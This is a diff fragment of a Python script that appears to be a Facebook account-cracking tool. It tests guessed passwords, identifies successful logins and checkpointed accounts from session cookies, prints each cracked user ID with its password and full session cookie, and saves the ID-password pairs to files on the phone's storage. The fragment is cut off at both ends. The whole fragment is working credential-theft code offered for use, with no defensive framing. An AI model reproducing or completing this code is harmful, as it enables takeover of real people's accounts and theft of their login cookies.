@@ -1,0 +1,23 @@
+#method ke nichy lo = session ke nichy
+log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = coki[151:166]
+                print(f'\r\33[1;97m[\033[1;96mMOOD-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;32m'+coki+ ' \n '+pro+' \033[1;32m')
+                cek_apk(session,coki)
+                open('/sdcard/MOOD-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                ok.append(uid)
+            elif 'checkpoint' in log_cookies:
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    uid=coki[141:156]
+                    print(f'\r\33[1;97m[\033[1;90mCheckpoint-MOOD\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
+                    open('/sdcard/MOOD-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    cp.append(uid)
+                    break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\33[1;35m[MOOD] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
+        sys.stdout.flush()
+    except:
+        pass
